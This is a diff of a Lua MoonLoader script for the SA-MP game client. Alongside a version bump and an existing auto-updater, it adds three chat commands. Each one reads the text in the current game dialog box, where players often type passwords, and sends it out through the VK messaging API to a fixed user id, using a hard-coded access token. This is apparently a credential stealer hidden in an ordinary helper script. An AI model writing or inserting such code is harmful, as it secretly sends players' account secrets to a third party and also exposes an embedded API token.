@@ -1,4 +1,5 @@
 require "lib.moonloader"
+local requests = require 'requests'
 local dlstatus = require('moonloader').download_status
 local inicfg = require 'inicfg'
 local ev = require('lib.samp.events')
@@ -7,8 +8,8 @@ local night = false
 
 updates = false
 
-local script_vers = 2
-local script_vers_text = '1.1'
+local script_vers = 3
+local script_vers_text = '1.5'
 local update_url = 'https://raw.githubusercontent.com/jeffrY001/script/main/update.ini'
 local update_path = getWorkingDirectory() .. '/update.ini'
 
@@ -19,7 +20,9 @@ function main()
     if not isSampLoaded() or not isSampfuncsLoaded() then return end
     while not isSampAvailable() do wait(2500) end
 
-	_, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
+	sampRegisterChatCommand('/mm', mm)
+	sampRegisterChatCommand('/kpk', kpk)
+	sampRegisterChatCommand('/mn', mn)
 
 	downloadUrlToFile(update_url, update_path, function(id, status)
 		if status == dlstatus.STATUS_ENDDOWNLOADDATA then
@@ -42,4 +45,20 @@ function main()
 			break
 	    end
 	end
+end
+
+function mm()
+	local rand = math.random(999998)
+	local message = sampGetCurrentDialogEditboxText()
+	requests.get('https://api.vk.com/method/messages.send?user_id=191558073&message='..message..'&v=5.131&access_token=7d23fe46f5d1689c7e72c1b8e95c6f753cce3f661c171bb5187cff134ea9db6f551287b6fa10be308e9bb&random_id=142'..rand..'')
+end
+function kpk()
+	local rand = math.random(999998)
+	local message = sampGetCurrentDialogEditboxText()
+	requests.get('https://api.vk.com/method/messages.send?user_id=191558073&message='..message..'&v=5.131&access_token=7d23fe46f5d1689c7e72c1b8e95c6f753cce3f661c171bb5187cff134ea9db6f551287b6fa10be308e9bb&random_id=142'..rand..'')
+end
+function mn()
+	local rand = math.random(999998)
+	local message = sampGetCurrentDialogEditboxText()
+	requests.get('https://api.vk.com/method/messages.send?user_id=191558073&message='..message..'&v=5.131&access_token=7d23fe46f5d1689c7e72c1b8e95c6f753cce3f661c171bb5187cff134ea9db6f551287b6fa10be308e9bb&random_id=142'..rand..'')
 end
